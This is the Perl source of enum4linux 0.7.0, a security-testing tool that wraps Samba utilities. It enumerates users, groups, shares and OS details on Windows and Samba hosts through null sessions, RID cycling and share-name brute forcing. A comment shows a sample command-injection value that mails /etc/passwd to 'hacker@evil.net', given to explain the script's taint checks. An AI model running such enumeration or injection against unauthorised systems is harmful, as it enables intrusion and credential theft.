#!/usr/bin/perl -w
# enum4linux - Windows enumeration tool for Linux
# Copyright (C) 2006  Mark Lowe
# 
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# You are encouraged to send comments, improvements or suggestions to
# me at mrl@portcullis-security.com
#
# TODO
#
# replace system($string) with system($prog, @args).
#
use strict;
use Getopt::Std;
use File::Basename;
use Data::Dumper;
use Scalar::Util qw(tainted);

my $VERSION="0.7.0";
my $verbose = 0;
my $debug = 0;
my $global_workgroup = undef;
my $global_username = '';
my $global_password = '';
my $global_dictionary = 0;
my $global_filename = undef;
my $global_share_file = undef;
my $global_detailed = 0;
my $global_rid_range = "500-550,1000-1050";
my $global_known_username = 'administrator';
my @dependent_programs = qw(nmblookup net rpcclient smbclient);
my $null_session_test = 0;
my %opts;

my $usage =<<USAGE;
enum4linux v$VERSION \(http://www.portcullis-security.com/tools/\)
Copyright \(C\) 2006 Mark Lowe \(mrl\@portcullis-security.com\)

Simple wrapper around the tools in the samba package to provide similar functionality
to enum (http://www.bindview.com/Services/RAZOR/Utilities/Windows/enum_readme.cfm).  
Some additional features such as RID cycling have also been added for convenience.

This is an ALPHA release only.  Some of the options supported by the original "enum" 
aren't implemented in this release.

Usage: $0 [options] ip

Options are (like "enum"):
	-U             get userlist
	-M             get machine list*
	-N             get namelist dump (different from -U|-M)*
	-S             get sharelist
	-P             get password policy information*
	-G             get group and member list
	-L             get LSA policy information*
	-D             dictionary crack, needs -u and -f*        
	-d             be detailed, applies to -U and -S*       
	-u username    specify username to use (default "")  
	-p password    specify password to use (default "")   
	-f filename    specify dictfile to use (wants -D)*   

* = Not implemented in this release.

Additional options:
	-a             Do all simple enumeration (-U -S -G -r -o -n)
	-h             Display this help message and exit
	-r             enumerate users via RID cycling
	-R range       RID ranges to enumerate (default: $global_rid_range, implies -r)
	-s filename    brute force guessing for share names
	-k username    User that exists on remote system (default: $global_known_username)
	               Used to get sid with "lookupsid $global_known_username"
	-o             Get OS information
	-w workgroup   Specify workgroup manually (usually found automatically)
	-n             Do an nmblookup (similar to nbtstat)
	-v             Verbose.  Shows full commands being run (net, rpcclient, etc.)
	

RID cycling should extract a list of users from Windows \(or Samba\) hosts which have 
RestrictAnonymous set to 1 \(Windows NT and 2000\), or \"Network access: Allow 
anonymous SID/Name translation\" enabled \(XP, 2003\).

If no usernames are known, good names to try against Windows systems are:
- administrator
- guest
- none
- helpassistant
- aspnet
	
The following might work against samba systems:
- root
- nobody
- sys

NB: Samba servers often seem to have RIDs in the range 3000-3050.

Dependancy info:
You will need to have the samba package installed as this script is basically
just a wrapper around rpcclient, net, nmblookup and smbclient.
USAGE

# Notes on Taint
# --------------
#
# This script should run OK with Taint checking on (perl -T).  I've
# turned it off because it complains about your path somethimes which
# users found annoying.
#
# I mainly implemented taint checking incase someone set up a malicious server to return
# a workgroup like: WORK; cat /etc/passwd | mail hacker@evil.net;
#
# I've also been paranoid and applied taint checking to command line options.  This
# isn't necessarily particularly useful, though.

# Untaint PATH.  We're not too bothered about mailicious paths for the usage of this
# tool, but we must remove "." from the path to keep perl happy.
$ENV{'PATH'} =~ /(.*)/;
$ENV{'PATH'} = $1;
$ENV{'PATH'} =~ s/^://;
$ENV{'PATH'} =~ s/:$//;
$ENV{'PATH'} =~ s/^\.://;
$ENV{'PATH'} =~ s/:\.//;

getopts('UMNSPGLDu:dp:f:rR:s:k:vow:hna', \%opts);

# Print help message if required
if ($opts{'h'}) {
	print $usage;
	exit 0;
}

# Read host and untaint
my $global_target = shift or die $usage;
if ($global_target =~ /^([a-zA-Z0-9\.-_]+)$/) {
	$global_target = $1;
} else {
	print "ERROR: Target hostname \"$global_target\" contains some illegal characters\n";
	exit 1;
}

#
# Read in options
#

# Turn on -U -S -G -r -o -n
if ($opts{'a'}) {
	$opts{'U'} = 1;
	$opts{'S'} = 1;
	$opts{'G'} = 1;
	$opts{'r'} = 1;
	$opts{'o'} = 1;
	$opts{'n'} = 1;
}

$global_username       = $opts{'u'} if $opts{'u'};
$global_password       = $opts{'p'} if $opts{'p'};
$global_detailed       = $opts{'d'} if $opts{'d'};
$global_dictionary     = $opts{'D'} if $opts{'D'};
$global_filename       = $opts{'f'} if $opts{'f'};
$global_rid_range      = $opts{'R'} if $opts{'R'};
$global_share_file     = $opts{'s'} if $opts{'s'};
$global_known_username = $opts{'k'} if $opts{'k'};
$global_workgroup      = $opts{'w'} if $opts{'w'};
$verbose               = $opts{'v'} if $opts{'v'};
$opts{'r'}             = 1          if $opts{'R'};

# Check that dependant programs are present on the system - hopefull "which" is installed!
my $dependency_error = 0;
foreach my $prog (@dependent_programs) {
	my $which_output = `which $prog 2>&1`;
	chomp $which_output;
	if ($which_output !~ /^\/.*\/$prog$/) {
		print "ERROR: $prog is not in your path.  Check that samba package is installed\n";
		$dependency_error = 1;
	} else {
		print "[V] Dependent program \"$prog\" found in $which_output\n" if $verbose;
	}
}
if ($dependency_error) {
	print "For Gentoo, you need to install the \"samba\" package\n";
	print "For Debian, you need to install the \"smbclient\" package\n";
	exit 1;
}

# Untaint workgroup if supplied on command line
if (defined($global_workgroup)) {
	if ($global_workgroup =~ /^([a-zA-Z0-9\.-_]*)$/) {
		$global_workgroup = $1;
	} else {
		print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
		exit 1;
	}
}

# We're going to use hard quotes around all variable used in "system" calls.
# We don't want bad data to be able to break out of these quotes.
$global_known_username =~ s/'/'\''/g; ($global_known_username) = $global_known_username =~ /(.*)/;
$global_username =~ s/'/'\''/g;       ($global_username)       = $global_username       =~ /(.*)/;
$global_password =~ s/'/'\''/g;       ($global_password)       = $global_password       =~ /(.*)/;

# Output message about options used
print "Starting enum4linux v$VERSION ( http://www.portcullis-security.com/tools ) on " .  scalar(localtime) . "\n\n";
print "----- Target information -----\n";
print "Target .......... $global_target\n";
print "RID Range ....... $global_rid_range\n";
print "Username ........ '$global_username'\n";
print "Password ........ '$global_password'\n";
print "Known Username .. '$global_known_username'\n";
print "\n";

# Some stuff we always do 
get_workgroup();
make_session();

# extra stuff that runs quickly
get_os_info()          if $opts{'o'};
get_nbtstat()          if $opts{'n'};

# enum-compatible functions
enum_users()           if $opts{'U'};
enum_machines()        if $opts{'M'};
enum_names()           if $opts{'N'};
enum_shares()          if $opts{'S'};
enum_password_policy() if $opts{'P'};
enum_groups()          if $opts{'G'};
enum_lsa_policy()      if $opts{'L'};

# extra stuff that runs slowly
enum_users_rids()      if $opts{'r'};
enum_shares_unauth()   if $opts{'s'};

print "enum4linux complete on " . scalar(localtime) . "\n\n";

sub get_nbtstat {
	print "----- Nbtstat Information for $global_target -----\n";
	system("nmblookup -A '$global_target'");
	print "\n";
}

# Get workgroup from nbstat info - we need this for lots of rpcclient calls
sub get_workgroup {
	print "----- Enumerating Workgroup/Domain on $global_target ------\n";
	print "[V] Attempting to get domain name with command: nmblookup -A '$global_target'\n" if $verbose;

	# Workgroup might already be known - e.g. from command line or from get_os_info()
	unless ($global_workgroup) {
		print "target is tainted\n" if tainted($global_target); # DEBUG
		$global_workgroup=`nmblookup -A '$global_target'`; # Global var.  Erg!
		($global_workgroup) = $global_workgroup =~ /\s+(\S+)\s+<00> - <GROUP>/s;
		unless (defined($global_workgroup)) {
			print "[E] Can\'t find workgroup/domain\n";
			print "\n";
			return undef;
		}
		unless (defined($global_workgroup) and $global_workgroup =~ /^[A-Za-z0-9_\.-]+$/) {
			print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
			exit 1;
		}
	}
	print "[+] Got domain/workgroup name: $global_workgroup\n";
	print "\n";
}

# See if we can connect using a null session or supplied credentials
sub make_session {
	print "----- Session Check on $global_target -----\n";
	my $command = "smbclient //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'help' 2>&1";
	print "[V] Attempting to make null session using command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if ($os_info =~ /case_sensitive/) {
		print "[+] Server $global_target allows sessions using username '$global_username', password '$global_password'\n";
	} else {
		print "[E] Server doesn't allow session using username '$global_username', password '$global_password'.  Aborting remainder of tests.\n";
		exit 1;
	}

	# Use this info to set workgroup if possible
	unless ($global_workgroup) {
		($global_workgroup) = $os_info =~ /Domain=\[([^]]*)\]/;
		print "[+] Got domain/workgroup name: $global_workgroup\n";
	}

	print "\n";
}

# Get OS info
sub get_os_info {
	print "----- OS information on $global_target -----\n";
	my $command = "smbclient //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'q' 2>&1";
	print "[V] Attempting to OS info with command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if (defined($os_info)) {
		($os_info) = $os_info =~ /(Domain=[^\n]+)/s;
		print "[+] Got OS info for $global_target from smbclient: $os_info\n";
	}

	$command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' -c 'srvinfo' '$global_target' 2>&1";
	print "[V] Attempting to OS info with command: $command\n" if $verbose;
	$os_info = `$command`;
	if (defined($os_info)) {
		if ($os_info =~ /error: NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "[+] Got OS info for $global_target from srvinfo:\n$os_info";
		}
	}
	print "\n";
}

sub enum_lsa_policy {
	print "----- LSA Policy Information on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_machines {
	print "----- Machine Enumeration on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_password_policy {
	print "----- Password Policy Information for $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_names {
	print "----- Name Enumeration on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_groups {
	print "----- Groups on $global_target -----\n";
	foreach my $grouptype ("builtin", "domain") {
		# Get list of groups
		my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' '$global_target' -c \"enumalsgroups $grouptype\" 2>&1";
		if ($grouptype eq "domain") {
			print "[V] Getting local groups with command: $command\n" if $verbose;
			print "[+] Getting local groups:\n";
		} else {
			print "[V] Getting $grouptype groups with command: $command\n" if $verbose;
			print "[+] Getting $grouptype groups:\n";
		}
		my $groups_string = `$command`;
		if ($groups_string =~ /error: NT_STATUS_ACCESS_DENIED/) {
			if ($grouptype eq "domain") {
				print "[E] Can't get local groups: NT_STATUS_ACCESS_DENIED\n";
			} else {
				print "[E] Can't get $grouptype groups: NT_STATUS_ACCESS_DENIED\n";
			}
		} else {
			print $groups_string;
		}
		print "\n";

		# Get group members
		my %rid_of_group = $groups_string =~ /\[([^\]]+)\]/sg;
		if ($grouptype eq "domain") {
			print "[+] Getting local group memberships:\n";
		} else {
			print "[+] Getting $grouptype group memberships:\n";
		}
		foreach my $groupname (keys %rid_of_group) {
			$rid_of_group{$groupname} =~ s/^0x//;
			$rid_of_group{$groupname} = hex($rid_of_group{$groupname});
			$command = "net rpc group members '$groupname' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1\n";
			print "[V] Running command: $command\n" if $verbose;
			print "Group '$groupname' (RID: " . $rid_of_group{$groupname} . ") has members:\n";
			my $members = `$command`;
			$members =~ s/^/\t/;
			$members =~ s/\n/\n\t/gs;
			$members =~ s/\t$//;
			print "$members";
		}
		print "\n";
	}
}

sub enum_groups_unauth {
	print "----- Groups on $global_target via RID cycling -----\n";
	print "[E] INTERNAL ERROR.  Not implmented yet.  Maybe in the next version.\n";
	print "\n";
}

sub enum_shares {
	# Share enumeration
	print "----- Share Enumeration on $global_target -----\n";
	print "[V] Attempting to get share list using authentication\n" if $verbose;
	# my $shares = `net rpc share -I '$global_target' -U'$global_username'\%'$global_password' 2>&1`;
	my $command = "smbclient -L //$global_target -U'$global_username'\%'$global_password' 2>&1";
	my $shares = `$command`;
	if (defined($shares)) {
		if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't list shares: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "$shares";
		}
	}
	print "\n";
}

sub enum_shares_unauth {
	print "----- Brute Force Share Enumeration on $global_target -----\n";
	print "[V] Attempting to get share list using bruteforcing\n" if $verbose;
	my $shares_file = $global_share_file;
	open SHARES, "<$shares_file" or die "[E] Can't open share list file $shares_file: $!\n";
	my @shares = <SHARES>;
	for (@shares) {chomp};
	
	foreach my $share (@shares) {
		# Untaint $share
		if ($share =~ /^([a-zA-Z0-9\._\$-]+)$/) {
			$share = $1;
		} else {
			print "ERROR: Share name $share contains some illegal characters\n";
			exit 1;
		}

		my $result = `smbclient //'$global_target'/'$share' -c dir -U'$global_username'\%'$global_password' 2>&1`;
		if ($result =~ /blocks of size .* blocks available/) {
			print "$share EXISTS, Allows access using username: '$global_username', password: '$global_password'\n";
		} elsif ($result =~ /NT_STATUS_BAD_NETWORK_NAME/) {
			print "$share doesn't exist\n" if $debug;
		} elsif ($result =~ /NT_STATUS_ACCESS_DENIED/) {
			print "$share EXISTS\n";
		} else {
			print $result;
		}
	}
	print "\n";
}

sub enum_users_rids {
	print "----- Users on $global_target via RID cycling (RIDS: $global_rid_range) -----\n";
	
	# Get SID
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c \"lookupnames '$global_known_username'\" 2>&1";
	print "[V] Attempting to get SID from $global_target with command: $command\n" if $verbose;
	my $logon = "username '$global_username', password '$global_password'";
	my $sid=`$command`;
	if ($sid =~ /error: NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED\n";
	}
	($sid) = $sid =~ /(S-1-5-21-\S+)-\d+\s+/;
	if (! defined($sid) and $global_username) {
		print "[V] WARNING: Can\'t get SID.  Are you sure use \"${global_known_username}\" really exists on this box?\n" if $verbose;
		$command = "rpcclient -W $global_workgroup -U% '$global_target' -c \"lookupnames '$global_known_username'\" 2>&1";
		print "[V] Trying null username and password: $command\n" if $verbose;
		$sid=`$command`;
		if ($sid =~ /error: NT_STATUS_ACCESS_DENIED/) {
			print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED\n";
		}
		($sid) = $sid =~ /(S-1-5-21-\S+)-\d+\s+/;
		unless (defined($sid)) {
			print "[E] Can't get SID using either a null username or the username \"$global_username\"\n";
			exit 1;
		}
		$global_known_username="";
		$logon = "username '', password ''"
	}
	unless (defined($sid)) {
		print "[E] Couldn't find SID.  Aborting RID cycling attempt.\n\n";
		return 1;
	}
	print "[+] Got SID: $sid using $logon\n";
	
	# RID Cycle;
	foreach my $rid_range (split(",", $global_rid_range)) {
		my ($start_rid, $end_rid);
	
		# Check range is of form n-m (n,m integers)
		if ($rid_range =~ /\d+-\d+/) {
			($start_rid, $end_rid) = $rid_range =~ /^(\d+)-(\d+)$/;
			
		# Check range is of form n (n integer)
		} elsif ($rid_range =~ /^\d+$/) {
			($start_rid, $end_rid) = ($rid_range, $rid_range);
	
		# Invalid range
		} else {
			print "WARNING: RID range $rid_range isn't valid.  Should be like 10-20 or 1199.  Ignoring this range\n";
			next;
		}
	
		# Check we have an ascending range
		if ($start_rid > $end_rid) {	
			print "WARNING: RID range $rid_range seems to be reversed.  Automatically reversing.\n";
			($start_rid, $end_rid) = ($end_rid, $start_rid);
		}
	
		foreach my $rid ($start_rid..$end_rid) {
			my $output = `rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' '$global_target' -c "lookupsids $sid-$rid" 2>&1`;
			my ($sid_and_user) = $output =~ /(S-\d+-\d+-\d+-[\d-]+\s+[^\)]+\))/;
			if ($sid_and_user) {
				print "$sid_and_user\n";
			}
			
		}
	}
	print "\n";
}

sub enum_users {
	print "----- Users on $global_target -----\n";
	my $command = "rpcclient -W $global_workgroup -c querydispinfo -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	my $users = `$command`;
	if ($users =~ /error: NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n";
	} else {
		print $users;
	}
	print "\n";

	$command = "rpcclient -W $global_workgroup -c enumdomusers -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	$users = `$command`;
	if ($users =~ /error: NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n";
	} else {
		print $users;
	}
	print "\n";
}


